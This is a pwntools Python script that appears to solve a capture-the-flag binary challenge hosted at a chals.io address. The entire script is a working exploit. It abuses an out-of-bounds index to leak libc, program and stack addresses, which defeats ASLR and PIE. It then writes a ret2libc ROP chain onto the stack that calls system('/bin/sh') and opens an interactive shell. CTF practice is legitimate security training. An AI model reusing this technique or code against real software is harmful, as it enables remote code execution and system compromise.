#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched2")
# libc = ELF("/usr/lib/libc.so.6")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.update(binary=elf, encoding='latin-1')

def one_gadgets(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("spaceheroes-cardassian-targeting-system-2.chals.io", 443, ssl=True, sni="spaceheroes-cardassian-targeting-system-2.chals.io")
    else:
        return process(elf.path)


def main():
    def edit_stack_at_index(index, stuff):
        io.clean()
        io.sendline("3")
        io.clean()
        io.sendline(str(index))
        io.clean()
        io.sendline(str(stuff))
        io.clean()

    io = start()
    io.clean()

    # get a libc base
    io.sendline("hegz")
    io.clean()
    io.sendline("4")
    io.clean()
    io.sendline("13")
    io.recvuntil("these coordinates: ")

    libc_add = int(io.recvline().strip())
    success(f"Leaked a libc address: {hex(libc_add)}")
    puts = libc_add + 0x604ed
    success(f"Calculated puts address: {hex(puts)}")
    libc.address = puts - libc.sym.puts
    success(f"Calculated libc base: {hex(libc.address)}")

    io.clean()
    io.sendline("4")
    io.clean()
    io.sendline("17")
    io.recvuntil("these coordinates: ")
    main = int(io.recvline().strip())
    success(f"Leaked main address: {hex(main)}, defeating PIE...")
    elf.address = main - elf.sym.main

    io.clean()
    io.sendline("4")
    io.clean()
    io.sendline("-4")
    io.recvuntil("these coordinates: ")
    leaked_stack_addr = int(io.recvline().strip())
    success(f"Leaked stack address: {hex(main)}")
    binsh_ptr = leaked_stack_addr - 56

    rop = ROP([elf])

    the_cool_gadget = rop.find_gadget(["pop r13", "pop r14", "pop r15", "ret"]).address
    success(f"found a cool gadget: {hex(the_cool_gadget)}")
    edit_stack_at_index(1, rop.ret.address)
    edit_stack_at_index(2, rop.rdi.address)
    edit_stack_at_index(5, int.from_bytes(b"/bin/sh\0", byteorder='little'))
    edit_stack_at_index(3, binsh_ptr)
    edit_stack_at_index(4, libc.sym.system)
    edit_stack_at_index(-3, the_cool_gadget)


    io.interactive()


if __name__ == "__main__":
    main()

# puts offset: -0x1be770


# 0xc5a8fb2bb0
